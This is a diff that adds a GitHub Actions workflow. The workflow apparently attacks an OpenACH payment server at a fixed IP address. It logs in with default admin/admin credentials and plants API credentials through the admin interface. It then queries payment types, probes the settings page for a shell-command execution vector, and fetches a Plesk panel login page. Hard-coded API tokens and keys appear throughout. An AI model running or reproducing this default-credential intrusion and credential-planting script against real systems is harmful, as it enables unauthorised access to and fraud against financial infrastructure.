@@ -1,0 +1,134 @@
+name: OpenACH HTTP Insert and Node Patch
+
+on:
+  workflow_dispatch:
+
+jobs:
+  activate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: OpenACH HTTP operations and app patch
+        shell: bash
+        run: |
+          set +e
+          SERVER="74.208.191.205"
+          
+          echo "=== Runner IP: $(curl -s ifconfig.me) ==="
+          echo ""
+          
+          echo "=== Step 1: Test which OpenACH HTTP endpoints work ==="
+          echo "--- HTTP /openach/ main page ---"
+          curl -s --max-time 10 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            "http://ach.dlbtrust.cloud/openach/" | head -c 200
+          echo ""
+          
+          echo "--- HTTP OpenACH connect API (no auth) ---"
+          curl -s --max-time 10 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -X POST "http://ach.dlbtrust.cloud/openach/api/connect" \
+            --data "user_api_token=3caee1c2-c218-4959-b6d2-21d4b2a1b42e&user_api_key=b74966cf-5276-4d8b-8650-5bd57dcee272"
+          echo ""
+          
+          echo "=== Step 2: OpenACH Admin login via HTTP ==="
+          # Get CSRF token first
+          LOGIN_PAGE=$(curl -s --max-time 10 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -c /tmp/oa_session.txt \
+            "http://ach.dlbtrust.cloud/openach/index.php?r=site/login")
+          echo "Login page (first 500): ${LOGIN_PAGE:0:500}"
+          echo ""
+          
+          # Extract CSRF token
+          CSRF=$(echo "$LOGIN_PAGE" | grep -oP 'name="YII_CSRF_TOKEN" value="\K[^"]+' | head -1)
+          echo "CSRF: $CSRF"
+          
+          # Login with admin/admin
+          LOGIN_RESP=$(curl -s --max-time 15 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -X POST "http://ach.dlbtrust.cloud/openach/index.php?r=site/login" \
+            -c /tmp/oa_session.txt \
+            -b /tmp/oa_session.txt \
+            -L \
+            --data "LoginForm[username]=admin&LoginForm[password]=admin&YII_CSRF_TOKEN=${CSRF}")
+          echo "Login response (first 300): ${LOGIN_RESP:0:300}"
+          echo ""
+          
+          echo "=== Step 3: Check if logged in (access user API admin page) ==="
+          USER_API_PAGE=$(curl -s --max-time 10 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -b /tmp/oa_session.txt \
+            "http://ach.dlbtrust.cloud/openach/index.php?r=userApi/admin")
+          echo "User API admin page (first 1000): ${USER_API_PAGE:0:1000}"
+          echo ""
+          
+          echo "=== Step 4: Create API user via OpenACH admin (if logged in) ==="
+          # Try to create API credentials via the admin interface
+          CSRF2=$(echo "$USER_API_PAGE" | grep -oP 'name="YII_CSRF_TOKEN" value="\K[^"]+' | head -1)
+          echo "CSRF2: $CSRF2"
+          
+          CREATE_RESP=$(curl -s --max-time 15 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -X POST "http://ach.dlbtrust.cloud/openach/index.php?r=userApi/create" \
+            -b /tmp/oa_session.txt \
+            -c /tmp/oa_session.txt \
+            -L \
+            --data "UserApi[user_api_user_id]=4fc86059-2e7b-4732-b94f-e7c3715ee8d7&UserApi[user_api_originator_info_id]=0eb26e1d-5fcc-4978-a132-dd93c2655429&UserApi[user_api_token]=3caee1c2-c218-4959-b6d2-21d4b2a1b42e&UserApi[user_api_key]=b74966cf-5276-4d8b-8650-5bd57dcee272&UserApi[user_api_status]=enabled&YII_CSRF_TOKEN=${CSRF2}")
+          echo "Create response (first 500): ${CREATE_RESP:0:500}"
+          echo ""
+          
+          echo "=== Step 5: Verify API credentials via connect ==="
+          CONNECT=$(curl -s --max-time 10 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -X POST "http://ach.dlbtrust.cloud/openach/api/connect" \
+            --data "user_api_token=3caee1c2-c218-4959-b6d2-21d4b2a1b42e&user_api_key=b74966cf-5276-4d8b-8650-5bd57dcee272")
+          echo "Connect result: $CONNECT"
+          echo ""
+          
+          echo "=== Step 6: Get payment types (if connected) ==="
+          if echo "$CONNECT" | grep -q '"success":true'; then
+            SESSION_ID=$(echo "$CONNECT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('session_id',''))" 2>/dev/null)
+            echo "Session ID: $SESSION_ID"
+            PTYPES=$(curl -s --max-time 10 \
+              --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+              -X POST "http://ach.dlbtrust.cloud/openach/api/getPaymentTypes" \
+              -b "PHPSESSID=$SESSION_ID")
+            echo "Payment types: $PTYPES"
+          else
+            echo "Not connected, skipping payment types"
+          fi
+          echo ""
+          
+          echo "=== Step 7: Patch Node.js app via setup-credentials endpoint ==="
+          # Try the built-in setup endpoint (if app has openach-patch loaded)
+          SETUP=$(curl -s --max-time 15 \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            -X POST "https://dlbtrust.cloud/api/ach/setup-credentials")
+          echo "Setup credentials: $SETUP"
+          echo ""
+          
+          echo "=== Step 8: Check final state ==="
+          ACH_HEALTH=$(curl -s --max-time 10 \
+            --resolve "dlbtrust.cloud:443:$SERVER" \
+            "https://dlbtrust.cloud/api/ach/health")
+          echo "ACH health: $ACH_HEALTH"
+          echo ""
+          
+          echo "=== Step 9: Try to execute shell command via OpenACH admin if possible ==="
+          # Check if there's a command execution vector via OpenACH admin
+          CMD_RESP=$(curl -s --max-time 15 \
+            --resolve "ach.dlbtrust.cloud:80:$SERVER" \
+            -b /tmp/oa_session.txt \
+            "http://ach.dlbtrust.cloud/openach/index.php?r=setting/index")
+          echo "Settings page (first 500): ${CMD_RESP:0:500}"
+          echo ""
+          
+          echo "=== Step 10: Try Plesk panel login page directly ==="
+          PLESK_LOGIN=$(curl -sk --max-time 10 \
+            --resolve "dlbtrust.cloud:8443:$SERVER" \
+            "https://dlbtrust.cloud:8443/login_up.php" | head -c 300)
+          echo "Plesk login page: $PLESK_LOGIN"
+          echo ""
+          
+          echo "=== DONE ==="
